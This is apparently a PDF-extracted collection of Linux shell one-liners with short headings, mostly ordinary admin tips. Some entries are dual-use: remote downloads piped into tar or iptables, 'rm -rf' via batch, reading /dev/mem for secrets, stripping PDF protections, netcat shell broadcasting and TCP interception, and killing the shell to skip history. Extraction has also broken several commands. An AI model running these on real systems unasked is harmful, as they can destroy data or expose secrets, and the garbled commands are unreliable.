### TechCircleRun the last command as root
``` linux
$ sudo !!
```
### Serve current directory tree at http://$HOSTNAME:8000/
``` linux
$ python -m SimpleHTTPServer
```
### Runs previous command but replacing
``` linux
$ ^foo^bar
```
### Rapidly invoke an editor to write a long, complex, or tricky
``` linux
$ ctrl-x e
```
### Place the argument of the most recent command on the shell
``` linux
$ 'ALT+.' or '<ESC> .'
```
### Salvage a borked terminal
``` linux
$ reset
```
### Currently mounted filesystems in nice layout
``` linux
$ mount | column -t
```
### Execute a command at a given time
``` linux
$ echo "ls -l" | at midnight
```
### Get your external IP address
``` linux
$ curl ifconfig.me
```
### Quick access to the ascii table.
``` linux
$ man ascii
```
### Query Wikipedia via console over DNS
``` linux
$ dig +short txt <keyword>.wp.dg.cx
```
### Output your microphone to a remote computer's speaker
``` linux
$ dd if=/dev/dsp | ssh -c arcfour -C username@host dd of=/dev/dsp
```
### 19 | P a g e
```
### TechCircleType partial command, kill this command, check something you
```
### forgot, yank the command, resume typing.
``` linux
$ <ctrl+u> [...] <ctrl+y>
```
### Mount folder/filesystem through SSH
``` linux
$ sshfs name@server:/path/to/folder /path/to/mount/point
```
### Mount a temporary ram partition
``` linux
$ mount -t tmpfs tmpfs /mnt -o size=1024m
```
### Download an entire website
``` linux
$ wget --random-wait -r -p -e robots=off -U mozilla http://www.example.com
```
### Clear the terminal screen
``` linux
$ ctrl-l
```
### Update twitter via curl
``` linux
$ curl -u user:pass -d status="Tweeting from the shell"
```
### http://twitter.com/statuses/update.xml
```
### Compare a remote file with a local file
``` linux
$ ssh user@host cat /path/to/remotefile | diff/path/to/localfile -
```
### A very simple and useful stopwatch
``` linux
$ time read (ctrl-d to stop)
```
### SSH connection through host in the middle
``` linux
$ ssh -t reachable_host ssh unreachable_host
```
### Watch Star Wars via telnet
``` linux
$ telnet towel.blinkenlights.nl
```
### Make 'less' behave like 'tail -f'.
``` linux
$ less +F somelogfile
```
### Close shell keeping all subprocess running
``` linux
$ disown -a && exit
```
### Put a console clock in top right corner
``` linux
$ while sleep 1;do tput sc; tput cup 0 $(($( tputcols)-29));date; tput rc;done &
```
### Shutdown a Windows machine from Linux
``` linux
$ net rpc shutdown -I ipAddressOfWindowsPC -U username%password
```
### 20 | P a g e
```
### TechCircleList of commands you use most often
``` linux
$ history | awk '{a[$2]++}END{for(i in a){print a[i] " " i}}' | sort -rn | head
```
### Set audible alarm when an IP address comes online
``` linux
$ ping -i 60 -a IP_address
```
### 32 bits or 64 bits?
``` linux
$ getconf LONG_BIT
```
### Reboot machine when everything is hanging
``` linux
$ <alt> + <print screen/sys rq> + <R> - <S> - <E> - <I> - <U> - <B>
```
### Simulate typing
``` linux
$ echo "You can simulate on-screen typing just like in the movies" | pv -qL 10
```
### Display the top ten running processes - sorted by memory usage
``` linux
$ ps aux | sort -nk +4 | tail
```
### Quickly rename a file
``` linux
$ mv filename.{old,new}
```
### Push your present working directory to a stack that you can pop
```
### later
``` linux
$ pushd /tmp
```
### Escape any command aliases
``` linux
$ \[command]
```
### Easy and fast access to often executed commands that are very long
```
### and complex.
``` linux
$ some_very_long_and_complex_command # label
```
### Watch Network Service Activity in Real-time
``` linux
$ lsof -i
```
### Diff two unsorted files without creating temporary files
``` linux
$ diff <(sort file1) <(sort file2)
```
### Create a script of the last executed command
``` linux
$ echo "!!" > foo.sh
```
### Delete all files in a folder that don't match a certain file extension
``` linux
$ rm !(*.foo|*.bar|*.baz)
```
### 21 | P a g e
```
### TechCircleShow apps that use internet connection at the moment. (Multi-
```
### Language)
``` linux
$ lsof -P -i -n
```
### Sharing file through http 80 port
``` linux
$ nc -v -l 80 < file.ext
```
### Reuse all parameter of the previous command line
``` linux
$ !*
```
### Display a block of text with AWK
``` linux
$ awk '/start_pattern/,/stop_pattern/' file.txt
```
### Set CDPATH to ease navigation
``` linux
$ CDPATH=:..:~:~/projects
```
### Backticks are evil
``` linux
$ echo "The date is: $( date +%D)"
```
### Save command output to image
``` linux
$ ifconfig | convert label:@- ip.png
```
### Add Password Protection to a file your editing in vim.
``` linux
$ vim -x <FILENAME>
```
### Show File System Hierarchy
``` linux
$ man hier
```
### Kills a process that is locking a file.
``` linux
$ fuser -k filename
```
### Remove duplicate entries in a file without sorting.
``` linux
$ awk '!x[$0]++' <file>
```
### Find Duplicate Files (based on size first, then MD5 hash)
``` linux
$ find -not -empty -type f -printf "%s
```
### " | sort -rn | uniq -d | xargs -I{} -n1 find -type f -size {}c -print0 | xargs -0 md5sum |
```
### sort | uniq -w32 --all-repeated=separate
```
### Python smtp server
``` linux
$ python -m smtpd -n -c DebuggingServer localhost:1025
```
### Insert the last command without the last argument (bash)
``` linux
$ !:-
```
### 22 | P a g e
```
### TechCircleDisplay which distro is installed
``` linux
$ cat /etc/issue
```
### Copy your SSH public key on a remote machine for passwordless
```
### login - the easy way
``` linux
$ ssh-copy-id username@hostname
```
### Extract tarball from internet without local saving
``` linux
$ wget -qO - "http://www. tarball.com/ tarball.gz" |tar zxvf -
```
### Find the process you are looking for minus the grepped one
``` linux
$ ps aux | grep [p]rocess-name
```
### Google Translate
``` linux
$ translate(){ wget -qO-
```
### "http://ajax.googleapis.com/ajax/services/language/translate?
```
### v=1.0&q=$1&langpair=$2|${3:-en}" |sed 's/.*"translatedText":"\([^"]*\)".*}/\1
```
### /'; }
```
### Matrix Style
``` linux
$ tr -c "[:digit:]" " " < /dev/urandom | ddcbs=$COLUMNS conv=unblock |
```
### GREP_COLOR="1;32" grep --color "[^ ]"
```
### Rip audio from a video file.
``` linux
$ mplayer -ao pcm -vo null -vc dummy -dumpaudio -dumpfile <output-file> <input-
```
### file>
```
### Inserts the results of an autocompletion in the command line
``` linux
$ ESC *
```
### Copy your ssh public key to a server from a machine that doesn't
```
### have ssh-copy-id
``` linux
$ cat ~/. ssh/id_rsa.pub | ssh user@machine "mkdir ~/. ssh; cat >> ~/.
```
### ssh/authorized_keys"
```
### Replace spaces in filenames with underscores
``` linux
$ rename 'y/ /_/' *
```
### A fun thing to do with ram is actually open it up and take a peek.
```
### This command will show you all the string (plain text) values in ram
``` linux
$ dd if=/dev/mem | cat | strings
```
### Create a CD/DVD ISO image from disk.
``` linux
$ readom dev=/dev/scd0 f=/path/to/image.iso
```
### 23 | P a g e
```
### TechCircleIntercept stdout/stderr of another process
``` linux
$ strace -ff -e trace=write -e write=1,2 -p SOME_PID
```
### Define a quick calculator function
``` linux
$ ? () { echo "$*" | bc -l; }
```
### Stream YouTube URL directly to mplayer.
``` linux
$ i="8uyxVmdaJ-w";mplayer -fs $(curl -s "http://www.youtube.com/get_video_info?
```
### &video_id=$i" | echo -e $(sed 's/%/\\x/g;s/.*\(v[0-9]\.lscache.*\)/http:\/\/\1/g') | grep -
```
### oP '^[^|,]*')
```
### Copy a file using pv and watch its progress
``` linux
$ pv sourcefile > destfile
```
### Graphical tree of sub-directories
``` linux
$ ls -R | grep ":$" | sed -e 's/:$//' -e 's/[^-][^\/]*\//--/g' -e 's/^/ /' -e 's/-/|/'
```
### Easily search running processes (alias).
``` linux
$ alias 'ps?'='ps ax | grep '
```
### Rapidly invoke an editor to write a long, complex, or tricky
```
### command
``` linux
$ fc
```
### Git remove files which have been deleted
``` linux
$ git add -u
```
### Mkdir & cd into it as single command
``` linux
$ mkdir /home/foo/doc/bar && cd $_
```
### Create a pdf version of a manpage
``` linux
$ man -t manpage | ps2pdf - filename.pdf
```
### Remove all but one specific file
``` linux
$ rm -f !(survivior.txt)
```
### Make directory including intermediate directories
``` linux
$ mkdir -p a/long/directory/path
```
### Multiple variable assignments from command output in BASH
``` linux
$ read day month year <<< $(date +'%d %m %y')
```
### Show apps that use internet connection at the moment. (Multi-
```
### Language)
``` linux
$ ss -p
```
### 24 | P a g e
```
### TechCircleEdit a file on a remote host using vim
``` linux
$ vim scp://username@host//path/to/somefile
```
### Job Control
``` linux
$ ^Z $bg $disown
```
### Generate a random password 30 characters long
``` linux
$ s trings /dev/urandom | grep -o '[[:alnum:]]' |head -n 30 | tr -d '
```
### '; echo
```
### Monitor progress of a command
``` linux
$ pv access.log | gzip > access.log.gz
```
### Graph # of connections for each hosts.
``` linux
$ netstat -an | grep ESTABLISHED | awk '{ print$5}' | awk -F: '{ print $1}' | sort |
```
### uniq -c | awk '{printf("%s\t%s\t",$2,$1) ; for (i = 0; i < $1; i++) { printf("*")}; print
```
### "" }'
```
### Search for a <pattern> string inside all files in the current directory
``` linux
$ grep -RnisI <pattern> *
```
### Record a screencast and convert it to an mpeg
``` linux
$ ffmpeg -f x11grab -r 25 -s 800x600 -i :0.0 /tmp/outputFile.mpg
```
### Convert seconds to human-readable format
``` linux
$ date -d@1234567890
```
### Monitor the queries being run by MySQL
``` linux
$ watch -n 1 mysqladmin --user=<user> --password=<password> processlist
```
### Send pop-up notifications on Gnome
``` linux
$ notify-send ["<title>"] "<body>"
```
### Show numerical values for each of the 256 colors in bash
``` linux
$ for code in {0..255}; do echo -e "\e[38;05;${code}m $code: Test"; done
```
### Remove security limitations from PDF documents using ghostscript
``` linux
$ gs -q -dNOPAUSE -dBATCH -sDEVICE=pdfwrite -sOutputFile=OUTPUT.pdf -
```
### c .setpdfwrite -f INPUT.pdf
```
### Check your unread Gmail from the command line
``` linux
$ curl -u username:password --silent "https://mail.google.com/mail/feed/atom" | tr -d
```
### '
```
### ' | awk -F '<en try>' '{for (i=2; i<=NF; i++) {print $i}}' | sed -n
```
"s/<title>\(.*\)<\/title.*name>\(.*\)<\/name>.*/\2 - \1/p"
```
### TechCircleSearch commandlinefu.com from the command line using the API
``` linux
$ cmdfu(){ curl"http://www.commandlinefu.com/commands/matching/$@/$(echo -n
```
### $@ | openssl base64)/plaintext"; }
```
### Display a cool clock on your terminal
``` linux
$ watch -t -n1 "date +%T|figlet"
```
### (Debian/Ubuntu) Discover what package a file belongs to
``` linux
$ dpkg -S /usr/bin/ls
```
### Processor / memory bandwidthd? in GB/s
``` linux
$ dd if=/dev/zero of=/dev/null bs=1M count=32768
```
### Mount a .iso file in UNIX/Linux
``` linux
$ mount /path/to/file.iso /mnt/cdrom -oloop
```
### Get the 10 biggest files/folders for the current direcotry
``` linux
$ du -s * | sort -n | tail
```
### Create a persistent connection to a machine
``` linux
$ ssh -MNf <user>@<host>
```
### Remove a line in a text file. Useful to fix
``` linux
$ ssh-keygen -R <the_offending_host>
```
### Open Finder from the current Terminal location
``` linux
$ open .
```
### Makes the permissions of file2 the same as file1
``` linux
$ chmod --reference file1 file2
```
### Show a 4-way scrollable process tree with full details.
``` linux
$ ps awwfux | less -S
```
### Attach screen over ssh
``` linux
$ ssh -t remote_host screen -r
```
### Run a command only when load average is below a certain threshold
``` linux
$ echo "rm -rf /unwanted-but-large/folder" | batch
```
### List all bash shortcuts
``` linux
$ bind -P
```
### TechCircleStart COMMAND, and kill it if still running after 5 seconds
``` linux
$ timeout 5s COMMAND
```
### Pretend to be busy in office to enjoy a cup of coffee
``` linux
$ cat /dev/urandom | hexdump -C | grep "ca fe"
```
### Recursively remove all empty directories
``` linux
$ find . -type d -empty -delete
```
### Create a quick back-up copy of a file
``` linux
$ cp file.txt{,.bak}
```
### To print a specific line from a file
``` linux
$ sed -n 5p <file>
```
### Directly ssh to host B that is only accessible through host A
``` linux
$ ssh -t hostA ssh hostB
```
### Remove all files previously extracted from a tar(.gz) file.
``` linux
$ tar -tf <file. tar.gz> | xargs rm -r
```
### Share a terminal screen with others
``` linux
$ % screen -r someuser/
```
### RTFM function
``` linux
$ rtfm() { help $@ || man $@ || $BROWSER "http://www.google.com/search?q=$@";}
```
### Broadcast your shell thru ports 5000, 5001, 5002 ...
``` linux
$ script -qf | tee >(nc -kl 5000) >(nc -kl 5001) >(nc -kl 5002)
```
### Edit a google doc with vim
``` linux
$ google docs edit --title "To-Do List" --editor vim
```
### Eavesdrop on your system
``` linux
$ diff <( lsof -p 1234) <(sleep 10; lsof -p 1234)
```
### Run a file system check on your next boot.
``` linux
$ touch /forcefsck
```
### Nice weather forecast on your shell
``` linux
$ curl wttr.in/seville
```
### Retry the previous command until it exits successfully
``` linux
$ until !!; do :; done
```
### 27 | P a g e
```
### TechCircleSynchronize date and time with a server over ssh
``` linux
$ date --set="$(ssh user@server date)"
```
### Google text-to-speech in mp3 format
``` linux
$ wget -q -U Mozilla -O output.mp3 "http://translate.google.com/translate_tts?
```
### ie=UTF-8&tl=en&q=hello+world
```
### List only the directories
``` linux
$ ls -d */
```
### What is my public IP-address?
``` linux
$ curl ifconfig.me
```
### Which program is this port belongs to ?
``` linux
$ lsof -i tcp:80
```
### Sort the size usage of a directory tree by gigabytes, kilobytes,
```
### megabytes, then bytes.
``` linux
$ du -b --max-depth 1 | sort -nr | perl -pe 's{([0-9]+)}{sprintf "%.1f%s",
```
### $1>=2**30? ($1/2**30, "G"): $1>=2**20? ($1/2**20, "M"): $1>=2**10? ($1/2**10,
```
### "K"): ($1, "")}e'
```
### Duplicate installed packages from one machine to the other (RPM-
```
### based systems)
``` linux
$ ssh root@remote.host "rpm -qa" | xargs yum -yinstall
```
### Draw kernel module dependancy graph.
``` linux
$ lsmod | perl -e ' print "digraph \" lsmod\" {";<>;while(<>){@_=split/\s+/; print
```
### "\"$_[0]\" -> \"$_\"
```
### " for split/,/,$_[3]} print "}"' | dot -Tpng | display -
```
### Download Youtube video with wget!
``` linux
$ wget http://www.youtube.com/watch?v=dQw4w9WgXcQ -qO- | sed -n
```
### "/fmt_url_map/{s/[\'\"\|]/
```
### /g;p}" | sed -n '/^fmt_url_map/,/videoplayback/p' | sed -e :a -e '$q;N;5,$D;ba' | tr -d '
```
### ' | sed -e 's/\(.*\),\(.\)\{1,3\}/\1/' | wget -i - -O surprise.flv
```
### Binary Clock
``` linux
$ watch -n 1 'echo "obase=2;`date +%s`" | bc'
```
### Remind yourself to leave in 15 minutes
``` linux
$ leave +15
```
### Download all images from a site
``` linux
$ wget -r -l1 --no-parent -nH -nd -P/tmp -A".gif,.jpg" http://example.com/images
```
### 28 | P a g e
```
### TechCircleFind out how much data is waiting to be written to disk
``` linux
$ grep ^Dirty /proc/meminfo
```
### Backup all MySQL Databases to individual files
``` linux
$ for I in $(mysql -e 'show databases' -s --skip-column-names); do mysqldump $I |
```
### gzip > "$I.sql.gz"; done
```
### Bring the word under the cursor on the :ex line in Vim
``` linux
$ :<C-R><C-W>
```
### Make directory tree
``` linux
$ mkdir -p work/{d1,d2}/{src,bin,bak}
```
### Convert Youtube videos to MP3
``` linux
$ youtube-dl -t --extract-audio --audio-format mp3 YOUTUBE_URL_HERE
```
### Using `!#$' to referance backward-word
``` linux
$ cp /work/host/phone/ui/main. cpp !#$:s/host/target
```
### Use tee to process a pipe with two or more processes
``` linux
$ echo "tee can split a pipe in two"|tee >(rev) >(tr ' ' '_')
```
### Get your outgoing IP address
``` linux
$ dig +short myip.opendns.com @resolver1.opendns.com
```
### Port Knocking!
``` linux
$ knock <host> 3000 4000 5000 && ssh -p <port> user@host && knock <host>
```
### 5000 4000 3000
```
### Compare two directory trees.
``` linux
$ diff <(cd dir1 && find | sort) <(cd dir2 && find | sort)
```
### Add timestamp to history
``` linux
$ export HISTTIMEFORMAT="%F %T "
```
### Search recursively to find a word or phrase in certain file types,
```
### such as C code
``` linux
$ find . -name "*.[ch]" -exec grep -i -H "search pharse" {} \;
```
### Recursively change permissions on files, leave directories alone.
``` linux
$ find ./ -type f -exec chmod 644 {} \;
```
### Find files that have been modified on your system in the past 60 minutes
``` linux
$ find / -mmin 60 -type f
```
### 29 | P a g e
```
### TechCircleQuick access to ASCII code of a key
``` linux
$ showkey -a
```
### Find files in a date range
``` linux
$ find . -type f -newermt "2010-01-01" ! -newermt "2010-06-01"
```
### Run complex remote shell cmds over ssh, without escaping quotes
``` linux
$ ssh host -l user $(<cmd.txt)
```
### A robust, modular log coloriser
``` linux
$ ccze
```
### Intercept, monitor and manipulate a TCP connection.
``` linux
$ mkfifo /tmp/fifo; cat /tmp/fifo | nc -l -p 1234 | tee -a to.log | nc machine port | tee -
```
### a from.log > /tmp/fifo
```
### Block known dirty hosts from reaching your machine
``` linux
$ wget -qO - http://infiltrated.net/blacklisted|awk '!/#|[a-z]/&&/./{print "iptables -A
```
### INPUT -s "$1" -j DROP"}'
```
### Check site ssl certificate dates
``` linux
$ echo | openssl s_client -connect www.google.com:443 2>/dev/null |openssl x509 -
```
### dates -noout
```
### Control ssh connection
``` linux
$ [enter]~?
```
### Python version 3: Serve current directory tree at
```
### http://$HOSTNAME:8000/
``` linux
$ python -m http.server
```
### Ls not pattern
``` linux
$ ls !(*.gz)
```
### Show apps that use internet connection at the moment.
``` linux
$ lsof -P -i -n | cut -f 1 -d " "| uniq | tail -n +2
```
### Colorized grep in less
``` linux
$ grep --color=always | less -R
```
### Given a file path, unplug the USB device on which the file is located
```
### (the file must be on an USB device !)
``` linux
$ echo $( sudo lshw -businfo | grep -B 1 -m 1 $(df "/path/to/file" | tail -1 | awk '{print
```
### $1}' | cut -c 6-8) | head -n 1 | awk '{print $1}' | cut -c 5- | tr ":" "-") | sudo tee
```
### /sys/bus/usb/drivers/usb/unbind
```
### 30 | P a g e
```
### TechCircleRemove a line in a text file. Useful to fix "ssh host key change"
```
### warnings
``` linux
$ sed -i 8d ~/.ssh/known_hosts
```
### Save a file you edited in vim without the needed permissions (no
```
### echo)
``` linux
$ :w !sudo tee > /dev/null %
```
### Analyze traffic remotely over ssh w/ wireshark
``` linux
$ ssh root@server.com 'tshark -f "port !22" -w -' |wireshark -k -i -
```
### Create a directory and change into it at the same time
``` linux
$ md () { mkdir -p "$@" && cd "$@"; }
```
### Exclude multiple columns using AWK
``` linux
$ awk '{$1=$3=""}1' file
```
### Easily find megabyte eating files or directories
``` linux
$ alias dush="du -sm *|sort -n|tail"
```
### Exclude .svn, .git and other VCS junk for a pristine tarball
``` linux
$ tar --exclude-vcs -cf src. tar src/
```
### Remove blank lines from a file using grep and save output to new
```
### file
``` linux
$ grep . filename > newfilename
```
### Delete a line from your shell history
``` linux
$ history -d
```
### Exit without saving history
``` linux
$ kill -9 $$
```
### How to establish a remote Gnu screen session that you can re-
```
### connect to
``` linux
$ ssh -t user@some.domain.com /usr/bin/screen -xRR
```
### Copy a MySQL Database to a new Server via SSH with one command
``` linux
$ mysqldump --add-drop-table --extended-insert --force --log-error=error.log -uUSER
```
### -pPASS OLD_DB_NAME | ssh -C user@newhost "mysql -uUSER -pPASS
```
### NEW_DB_NAME"
```
### Get the IP of the host your coming from when logged in remotely
``` linux
$ echo ${SSH_CLIENT%% *}
```
### 31 | P a g e
```
### TechCircleRandom Number Between 1 And X
``` linux
$ echo $[RANDOM%X+1]
```
### Notify yourself when a long-running command which has ALREADY
```
### STARTED is finished
``` linux
$ <ctrl+z> fg; notify_me
```
### Create colorized html file from Vim or Vimdiff
``` linux
$ :TOhtml
```
### Output your microphone to a remote computer's speaker
``` linux
$ arecord -f dat | ssh -C user@host aplay -f dat
```
### Create a nifty overview of the hardware in your computer
``` linux
$ lshw -html > hardware.html
```
### Save your sessions in vim to resume later
``` linux
$ :mksession! <filename>
```
### Convert PDF to JPG
``` linux
$ for file in `ls *.pdf`; do convert -verbose -colorspace RGB -resize 800 -interlace
```
### none -density 300 -quality 80 $ file `echo $ file | sed's/\.pdf$/\.jpg/'`; done
```
### Bind a key with a command
``` linux
$ bind -x '"\C-l":ls -l'
```
### Find all file larger than 500M
``` linux
$ find / -type f -size +500M
```
### GREP a PDF file.
``` linux
$ pdftotext [file] - | grep 'YourPattern'
```
### Live ssh network throughput test
``` linux
$ yes | pv | ssh $host "cat > /dev/null"
```
### Convert unixtime to human-readable
``` linux
$ date -d @1234567890
```
### A fun thing to do with ram is actually open it up and take a peek.
```
### This command will show you all the string (plain text) values in ram
``` linux
$ strings /dev/mem
```
### Prettify an XML file
``` linux
$ tidy -xml -i -m [file]
```
### 32 | P a g e
```
### TechCircleTell local Debian machine to install packages used by remote Debian
```
### machine
``` linux
$ ssh remotehost ' dpkg --get-selections' | dpkg --set-selections && dselect install
```
### Lists all listening ports together with the PID of the associated
```
### process
``` linux
$ lsof -Pan -i tcp -i udp
```
### Intersection between two files
``` linux
$ grep -Fx -f file1 file2
```
### Alias HEAD for automatic smart output
``` linux
$ alias head='head -n $((${LINES:-`tput lines 2>/dev/null||echo -n 12`} - 2))'
```
### Colorful man
``` linux
$ apt-get install most && update-alternatives --set pager /usr/bin/most
```
### Prints line numbers
``` linux
$ nl
```
### Diff on two variables
``` linux
$ diff <(echo "$a") <(echo "$b")
```
### Manually Pause/Unpause Firefox Process with POSIX-Signals
``` linux
$ killall -STOP -m firefox
```
### Use lynx to run repeating website actions
``` linux
$ lynx -accept_all_cookies -cmd_script=/your/keystroke-file
```
### Display a list of committers sorted by the frequency of commits
``` linux
$ svn log -q|grep "|"|awk "{print \$3}"|sort|uniq -c|sort -nr
```
### Check the status of 'dd' in progress (OS X)
``` linux
$ CTRL + T
```
### Convert seconds into minutes and seconds
``` linux
$ bc <<< 'obase=60;299'
```
### A child process which survives the parent's death (for sure)
``` linux
$ ( command & )
```
### Find usb device
``` linux
$ diff <(lsusb) <(sleep 3s && lsusb)
```
### 33 | P a g e
```
### TechCircleTake screenshot through SSH
``` linux
$ DISPLAY=:0.0 import -window root /tmp/shot.png
```
### Opens vi/vim at pattern in file
``` linux
$ vi +/pattern [file]
```
### April Fools' Day Prank
``` linux
$ PROMPT_COMMAND='if [ $RANDOM -le 3200 ]; then printf"\0337\033[%d;%dH\
```
### 033[4%dm \033[m\0338" $((RANDOM%LINES+1)) $((RANDOM%COLUMNS+1)) $
```
### ((RANDOM%8)); fi'
```
### Copy working directory and compress it on-the-fly while showing
```
### progress
``` linux
$ tar -cf - . | pv -s $(du -sb . | awk '{print $1}') |gzip > out.tgz
```
### Pipe stdout and stderr, etc., to separate commands
``` linux
$ some_command > >(/bin/cmd_for_stdout) 2> >(/bin/cmd_for_stderr)
```
### Schedule a script or command in x num hours, silently run in the
```
### background even if logged out
``` linux
$ ( ( sleep 2h; your-command your-args ) & )
```
### Go to parent directory of filename edited in last command
``` linux
$ cd !$:h
```
### Draw a Sierpinski triangle
``` linux
$ perl -e 'print "P1
```
### 256 256
```
### ", map {$_&($_>>8)?1:0} (0..0xffff)' | display
```
### Make anything more awesome
``` linux
$ command | figlet
```
### List all files opened by a particular command
``` linux
$ lsof -c dhcpd
```
### Gets a random Futurama quote from /.
``` linux
$ curl -Is slashdot.org | egrep '^X-(F|B|L)' | cut -d \- -f 2
```
### Recursive search and replace old with new string, inside files
``` linux
$ $ grep -rl oldstring . |xargs sed -i -e 's/oldstring/newstring/'
```
### Shut of the screen.
``` linux
$ xset dpms force standby
```
### 34 | P a g e
```
### TechCircleRuns a bash script in debugging mode
``` linux
$ bash -x ./post_to_commandlinefu.sh
```
### List the number and type of active network connections
``` linux
$ netstat -ant | awk '{print $NF}' | grep -v '[a-z]' |sort | uniq -c
```
### Encrypted archive with openssl and tar
``` linux
$ tar --create --file - --posix --gzip -- <dir> | openssl enc -e -aes256 -out <file>
```
### Create strong, but easy to remember password
``` linux
$ read -s pass; echo $pass | md5sum | base64 |cut -c -16
```
### Use file(1) to view device information
``` linux
$ file -s /dev/sd*
```
### Prevent accidents while using wildcards
``` linux
$ rm *.txt <TAB> <TAB>
```
### Insert the last argument of the previous command
``` linux
$ <ESC> .
```
### View the newest xkcd comic.
``` linux
$ xkcd(){ wget -qO- http://xkcd.com/|tee >(feh $(grep -Po
```
### '(?<=")http://imgs[^/]+/comics/[^"]+\.\w{3}'))|grep -Po '(?<=(\w{3})" title=").*(?
```
### =" alt)';}
```
### Press Any Key to Continue
``` linux
$ read -sn 1 -p "Press any key to continue..."
```
### Backup all your commandlinefu.com favourites to a plaintext file
``` linux
$ clfavs(){ URL="http://www.commandlinefu.com"; wget -O - --save-cookies c --
```
### post-data "username=$1&password=$2&submit=Let+me+in"
```
### $URL/users/signin;for i in `seq 0 25 $3`;dowget -O - --load-cookies c
```
### $URL/commands/favourites/plaintext/$i >>$4;done;rm -f c;}
```
### Remove color codes (special characters) with sed
``` linux
$ sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[m|K]//g"
```
### Throttle bandwidth with cstream
``` linux
$ tar -cj /backup | cstream -t 777k | ssh host ' tar-xj -C /backup'
```
### Run a long job and notify me when it's finished
``` linux
$ ./my-really-long-job.sh && notify-send "Job finished"
```
### When feeling down, this command helps
``` linux
$ sl
```
### 35 | P a g e
```
### TechCircleNicely display permissions in octal format with filename
``` linux
$ stat -c '%A %a %n' *
```
### Create a single-use TCP (or UDP) proxy
``` linux
$ nc -l -p 2000 -c "nc example.org 3000"
```
### Find geographical location of an ip address
``` linux
$ lynx -dump http://www.ip-adress.com/ip_tracer/?QRY=$1|grep address|egrep 'city|
```
### state|country'|awk '{print $3,$4,$5,$6,$7,$8}'|sed 's\ip address flag \\'|sed 's\My\\'
```
### Read manpage of a unix command as pdf in preview (Os X)
``` linux
$ man -t UNIX_COMMAND | open -f -a preview
```
### Instead of writing a multiline if/then/else/fi construct you can do
```
### that by one line
``` linux
$ [[ test_condition ]] && if_true_do_this || otherwise_do_that
```
### Switch 2 characters on a command line.
``` linux
$ ctrl-t
```
### Speed up launch of firefox
``` linux
$ find ~ -name '*.sqlite' -exec sqlite3 '{}' 'VACUUM;' \;
```
### Format txt as table not joining empty columns
``` linux
$ column -tns: /etc/passwd
```
### Shell recorder with replay
``` linux
$ script -t /tmp/mylog.out 2>/tmp/mylog.time; <do your work>; <CTRL-D>;
```
### scriptreplay /tmp/mylog.time /tmp/mylog.out
```
### Bind a key with a command
``` linux
$ bind '"\C-l":"ls -l
```
### "'
```
### Exclude a column with cut
``` linux
$ cut -f5 --complement
```
### List files with quotes around each filename
``` linux
$ ls -Q
```
### Duplicate several drives concurrently
``` linux
$ dd if=/dev/sda | tee >( dd of=/dev/sdb) | dd of=/dev/sdc
```
### 36 | P a g e
```
### TechCircleCreate an audio test CD of sine waves from 1 to 99 Hz
``` linux
$ ( echo CD_DA; for f in {01..99}; do echo "$f Hz">&2; sox -nt cdda -r44100 -c2
```
### $f.cdda synth 30 sine $f; echo TRACK AUDIO; echo FILE \"$f.cdda\" 0; done) >
```
### cdrdao.toc && cdrdao write cdrdao.toc && rm ??.cdda cdrdao.toc
```
### Listen to BBC Radio from the command line.
``` linux
$ bbcradio() { local s PS3="Select a station: ";select s in 1 1x 2 3 4 5 6 7 "Asian
```
### Network an" "Nations & Local lcl";do break;done;s=($s);mplayer -playlist
```
### "http://www.bbc.co.uk/radio/listen/live/r"${s[@]: -1}".asx";}
```
### Get your external IP address
``` linux
$ curl ip.appspot.com
```
### List installed deb packages by size
``` linux
$ dpkg-query -Wf '${Installed-Size}\t${Package}
```
### ' | sort -n
```
### Monitor bandwidth by pid
``` linux
$ nethogs -p eth0
```
### Execute a command with a timeout
``` linux
$ timeout 10 sleep 11
```
### Send echo to socket network
``` linux
$ echo "foo" > /dev/tcp/192.168.1.2/25
```
### Use vim to get colorful diff output
``` linux
$ svn diff | view -
```
### Find files containing text
``` linux
$ grep -lir "some text" *
```
### Perform a branching conditional
``` linux
$ true && { echo success;} || { echo failed; }
```
### Resume scp of a big file
``` linux
$ rsync --partial --progress --rsh=ssh $file_source $user@$host:$destination_file
```
### Brute force discover
``` linux
$ sudo zcat /var/log/auth.log.*.gz | awk '/Failed password/&&!/for invalid
```
### user/{a[$9]++}/Failed password for invalid user/{a["*" $11]++}END{for (i in a)
```
### printf "%6s\t%s
```
### ", a[i], i|"sort -n"}'
```
### 37 | P a g e
```
### TechCircleUse tee + process substitution to split STDOUT to multiple
```
### commands
``` linux
$ some_command | tee >(command1) >(command2) >(command3) ... | command4
```
### Annotate tail -f with timestamps
``` linux
$ tail -f file | while read; do echo "$(date +%T.%N) $REPLY"; done
```
### Fast, built-in pipe-based data sink
``` linux
$ <COMMAND> |:
```
### Repoint an existing symlink to a new location
``` linux
$ ln -nsf <TARGET> <LINK>
```
### GRUB2: set Super Mario as startup tune
``` linux
$ echo "GRUB_INIT_TUNE=\"1000 334 1 334 1 0 1 334 1 0 1 261 1 334 1 0 1 392 2
```
### 0 4 196 2\"" | sudo tee -a /etc/default/grub > /dev/null && sudo update-grub
```
### Find Duplicate Files (based on size first, then MD5 hash)
``` linux
$ fdupes -r .
```
### Close a hanging ssh session
``` linux
$ ~.
```
### Recover a deleted file
``` linux
$ grep -a -B 25 -A 100 'some string in the file' /dev/sda1 > results.txt
```
### Makes you look busy
``` linux
$ alias busy='my_file=$(find /usr/include -type f |sort -R | head -n 1); my_len=$(wc -
```
### l $my_file |awk "{print $1}"); let "r = $RANDOM % $my_len" 2>/dev/null; vim +$r
```
### $my_file'
```
### Convert filenames in current directory to lowercase
``` linux
$ rename 'y/A-Z/a-z/' *
```
### Find files that were modified by a given command
``` linux
$ touch /tmp/file ; $EXECUTECOMMAND ; find/path -newer /tmp/file
```
### Quickly graph a list of numbers
``` linux
$ gnuplot -persist <(echo "plot '<(sort -n listOfNumbers.txt)' with lines")
```
### Cut out a piece of film from a file. Choose an arbitrary length and
```
### starting time.
``` linux
$ ffmpeg -vcodec copy -acodec copy -i orginalfile -ss 00:01:30 -t 0:0:20 newfile
```
### 38 | P a g e
```
### TechCircleAnalyse an Apache access log for the most common IP addresses
``` linux
$ tail -10000 access_log | awk '{print $1}' | sort |uniq -c | sort -n | tail
```
### Prevent large files from being cached in memory (backups!)
``` linux
$ nocache <I/O-heavy-command>
```
### Convert single digit to double digits
``` linux
$ for i in ?.ogg; do mv $i 0$i; done
```
### Limit the cpu usage of a process
``` linux
$ sudo cpulimit -p pid -l 50
```
### Generate an XKCD #936 style 4 word password
``` linux
$ shuf -n4 /usr/share/dict/words | tr -d ' '
